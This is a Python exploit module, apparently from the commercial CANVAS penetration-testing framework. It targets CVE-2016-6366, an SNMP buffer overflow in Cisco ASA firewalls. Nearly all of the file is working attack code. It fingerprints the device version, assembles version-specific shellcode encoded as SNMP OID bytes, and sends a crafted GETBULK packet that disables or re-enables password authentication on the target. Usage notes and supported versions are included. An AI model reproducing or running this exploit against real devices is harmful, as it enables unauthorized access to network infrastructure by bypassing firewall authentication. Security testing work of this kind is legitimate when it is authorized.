#!/usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2006-2016
# http://www.immunityinc.com/CANVAS/ for more information

import sys
import time
import uuid
import logging
import random
import re

if '.' not in sys.path:
    sys.path.append('.')

from exploitutils import *
from canvaserror import *

from tcpexploit import tcpexploit
from libs.pysnmp import v2c, asn1

from Resources.offsets import offsets


NAME                           = 'CISCO SNMP OID mem corruption'
DESCRIPTION                    = 'Buffer overflow in Cisco ASA allows remote code execution via crafted SNMP packets'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Cisco'
DOCUMENTATION['Repeatability'] = 'Multiple Times'
DOCUMENTATION['CVE Name']      = 'CVE-2016-6366'
DOCUMENTATION['CVE Url']       = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6366'

VERSION                        = '0.3'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Remote'
PROPERTY['ARCH']               = [ ['Cisco'] ]
PROPERTY['VERSION']            = [ "ASA 8 x86", "ASA 9 x86" ]

DOCUMENTATION['Notes']         = """

python exploits/remote/cisco/cisco_snmp_oid/cisco_snmp_oid.py -t [ip] -p [port] -O community:[community] -O version:[0/1]
0 = disable password auth
1 = enable password auth

Supported versions:

- 8.4(5)
- 9.1(6)
- 9.2(4)

Current version of the exploit simply disables password authentication. We should
update this for MOSDEF support.
"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name               = NAME
        self.local_res          = os.path.join(os.path.dirname(__file__), 'Resources')
        self.host               = ""
        self.port               = 161
        self.community          = "community"
        self.version            = 0
        self.ver                = ""

        # XXX: We only perform pass_disable/pass_enable for now
        self.pass_disable       = "49.192.64.195"
        self.a_pass_enable      = "85.137.229.87"
        self.p_pass_enable      = "85.49.192.137"

        self.mode               = "disable"
        self.offsets            = offsets

    def getArgs(self):
        self.host       = self.target.interface
        self.port       = int(self.argsDict.get('port', self.port))
        self.community  = self.argsDict.get('community', self.community)
        mode            = int(self.argsDict.get('version', 0))
        if mode == 1:
            self.mode   = "enable"

    def is_vulnerable(self):
        self.getArgs()

        oids = [asn1.OBJECTID('.1.3.6.1.2.1.1.1.0').encode()]
        req  = v2c.GETREQUEST()
        req['community']    = self.community
        req['encoded_oids'] = oids

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(req.encode(), (self.host, self.port))
        data = None
        try:
            data = s.recv(2048)
        except timeoutsocket.Timeout as e:
            logging.error("Request timed out")
        finally:
            s.close()

        if data is None:
            logging.error("Unable to connect to target")
            return False

        response = v2c.GETRESPONSE()
        response.decode(data)

        values = map(lambda x: x[0](), map(asn1.decode, response['encoded_vals']))
        m      = re.search(".* Version (\d).(\d)\((\d)\)", values[0])
        if m:
            major  = int(m.group(1))
            minor  = int(m.group(2))
            bugfix = int(m.group(3))
        else:
            logging.error("Error while retrieving version from target")
            return False

        self.ver = "%d.%d(%d)" % (major, minor, bugfix)
        logging.info("Found version: %s" % self.ver)

        if self.ver in self.offsets:
            logging.info("Target is vulnerable/supported")
            return True
        else:
            logging.info("Target is not supported/vulnerable")
            return False

    def test(self):
        return self.is_vulnerable()

    def build_payload(self):
        head = "1.3.6.1.4.1.9.9.491.1.3.3.1.1.5" # cufwUrlfServerStatus
        head += ".9"
        head += ".95" # len

        # Jumps to our second stage
        first_stage = "139.124.36.20.139.63.255.231.144"

        if self.mode == "enable":
            admauth = self.a_pass_enable
            pmcheck = self.p_pass_enable
        else:
            admauth = self.pass_disable
            pmcheck = self.pass_disable

        second_stage = "104."
        second_stage += self.offsets[self.ver]['ret']
        second_stage += ".137.229.191.11.15.15.15.49.219.49.246.49.201.179.16.96.176.125.178.7.187."
        second_stage += self.offsets[self.ver]["admauth_page"]
        second_stage += ".181.16.205.128.49.192.176.125.187."
        second_stage += self.offsets[self.ver]["pmcheck_page"]
        second_stage += ".205.128.199.5."
        second_stage += self.offsets[self.ver]["admauth_offt"] + "." + admauth
        second_stage += ".199.5."
        second_stage += self.offsets[self.ver]["pmcheck_offt"] + "." + pmcheck
        second_stage += ".97.131.197." + self.offsets[self.ver]["ebp"]
        second_stage += ".195"

        second_stage_len = len(second_stage.split("."))
        second_stage += ".144" * (82 - second_stage_len)
        second_stage += "." + self.offsets[self.ver]["jmpesp"]

        return ".".join([head, second_stage, first_stage])

    def run(self):
        self.setInfo("%s (in progress on %s)" % (self.name, self.target.interface))

        if not self.is_vulnerable():
            return False

        self.setProgress(40)

        payload = self.build_payload()
        logging.debug("payload: %s (%d)" % (payload, len(payload.split("."))))

        oids = [asn1.OBJECTID(payload).encode()]
        req  = v2c.GETBULKREQUEST()
        req['community']       = self.community
        req['encoded_oids']    = oids
        req['request_id']      = random.randint(0x80000, 0x1fffffff)
        req['non_repeaters']   = len(oids)
        req['max_repetitions'] = 1

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(req.encode(), (self.host, self.port))
        data = None

        self.setProgress(80)

        data = None
        try:
            data = s.recv(2048)
        except timeoutsocket.Timeout as e:
            logging.error("Request timed out")
        finally:
            s.close()

        if data is None:
            logging.critical("Target did not respond, could have crashed")
            self.setInfo("%s Done (Failed)" % (self.name))
            self.setProgress(-1)
            return False

        response = v2c.GETRESPONSE()
        response.decode(data)

        if req['request_id'] == response['request_id']:
            logging.warning("Exploit succeeded")
            self.setInfo("%s Done (Success)" % (self.name))
            self.setProgress(100)

            return True
        else:
            logging.error("Exploit failed")
            self.setInfo("%s Done (Failed)" % (self.name))
            self.setProgress(-1)

        return False


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
